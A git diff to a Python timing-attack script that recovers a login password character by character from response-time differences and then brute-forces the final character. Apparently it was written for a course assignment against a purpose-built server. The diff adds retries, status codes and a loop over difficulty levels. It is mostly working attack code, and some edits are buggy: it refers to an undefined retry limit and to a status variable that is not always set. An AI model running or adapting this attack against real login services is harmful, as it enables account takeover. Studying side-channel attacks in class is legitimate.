@@ -4,6 +4,7 @@
 """
 
 from abc import ABC, abstractmethod
+from collections import defaultdict
 from dataclasses import dataclass
 import statistics
 from typing import Dict, Any, List, Tuple
@@ -377,7 +378,7 @@ class TimingAttacker:
         return self.decision_engine.decide(candidates_samples)
 
 
-    async def _attack_last_position(self, prefix: str) -> str:
+    async def _attack_last_position(self, prefix: str) -> Tuple[str, str]:
         """Brute-force the final character by checking for success response.
 
         Args:
@@ -385,6 +386,7 @@ class TimingAttacker:
 
         Returns:
             Complete password.
+            Status as str. "1" success "0" failure
         """
         async def get_resbody_for_char(char: str) -> Tuple[str, str]:
             payload = {"password": prefix + char}
@@ -396,24 +398,24 @@ class TimingAttacker:
 
         for char, body_txt in results:
             if body_txt == "1":
-                return prefix + char
+                return prefix + char, body_txt
 
-        return prefix
+        return prefix, body_txt
     
 
     async def attack(
         self,
         password_len: int,
-        top_k: int = 5,
+        top_k: int = 3,
         max_rounds: int = 3,
         sample_increment: int = 1,
         max_samples: int = 10,
         initial_samples: int = 3,
         min_gap_microseconds: int = 200
-    ) -> str:
+    ) -> Tuple[str, str]:
         """Perform the complete timing attack.
 
-        Args:
+        Args:S
             password_len: Length of the password (as detected or known).
             top_k: Number of candidates to keep between rounds.
             max_rounds: Maximum refinement rounds per position.
@@ -422,13 +424,14 @@ class TimingAttacker:
             initial_samples: Starting number of samples per candidate.
             min_gap_microseconds: Minimum timing gap to trust a decision.
 
-        Returns:
+        Returns: Tuple[str, str]
             Recovered password as string.
+            Attack Status code as string. ("1" for succuess "0" for failure).
         """
         password = ""
         for pos in range(password_len):
             if pos == password_len - 1:
-                password = await self._attack_last_position(prefix=password)
+                password, status = await self._attack_last_position(prefix=password)
                 break
             
             suffix = self.padding * (password_len - len(password) - 1)
@@ -446,18 +449,18 @@ class TimingAttacker:
             )
             password += next_char
 
-        return password
+        return password, status
     
 
 # ==========================
 # Main
 # ==========================
-def calibrate_attack_params(difficulty: int = 1) -> Dict[str: int]:
+def calibrate_attack_params(difficulty: int = 1) -> Dict[str, int]:
     attack_params = {
-        "initial_samples": max(2, difficulty) if difficulty <= 5 else difficulty * 2,
+        "initial_samples": 3, #max(2, difficulty) if difficulty <= 5 else difficulty * 2,
         "sample_increment": 2 if difficulty <= 4 else difficulty,
         "max_samples": max(10, difficulty * 5),
-        "min_gap_us": max(1000, 100000 // difficulty),
+        "min_gap_microseconds": 200, # max(1000, 100000 // difficulty),
         "top_k": 3 if difficulty <= 3 else 5,
         "max_rounds": 3 if difficulty <= 2 else 5
     }
@@ -477,28 +480,38 @@ async def commit_full_attack(username: str, victim: VictimServer, difficulty: in
     attack_params = calibrate_attack_params(difficulty=difficulty)
 
     try:
-        password_length = await attacker.detect_password_length()
-        password = await attacker.attack(password_len=password_length, **attack_params)
-        # TODO: check if succuss (1), if not do retrie
-        await async_http_sender.close_sessions()
+        attack_status = "0"
+        retries = 0
+
+        while (attack_status != "1") and retries < retries_on_fail:
+            retries += 1
+
+            password_length = await attacker.detect_password_length(samples_for_pwd_len=max(4, difficulty))
+            print(f"difficulty ({difficulty}) || pwd len detected is [ {password_length} ]")
+            password, attack_status = await attacker.attack(password_len=password_length) #, **attack_params TODO:)
+            print(f"    retries ({retries}) || attack_status [ {attack_status} ]")
+            await async_http_sender.close_sessions()
+        
+        return password
     
     except Exception as e:
         await async_http_sender.close_sessions()
-
-
-
+        raise Exception(e)
 
 async def main():
     BASE_URL = "http://aoi-assignment1.oy.ne.ro:8080/"
     USERNAME = "315388850"
-    MAX_DIFFICULTY = 5
+    MAX_DIFFICULTY = 10
 
     victim = VictimServer(url=BASE_URL)
 
+    total_start_ns = time.perf_counter()
+    for difficulty in range(1, MAX_DIFFICULTY + 1):
+        start_ns = time.perf_counter()
+        password = await commit_full_attack(username=USERNAME, victim=victim, difficulty=difficulty)
+        print(f"    [{time.ctime()}] | level_time: {(time.perf_counter() - start_ns) / 60} difficulty ({difficulty}) | password: {password}")
 
-
-
-
+    print(f"MAX DIFFICULTY = {MAX_DIFFICULTY} || TOTAL TIME: {(time.perf_counter() - total_start_ns) / 60}")
 
 if __name__ == "__main__":
     asyncio.run(main())
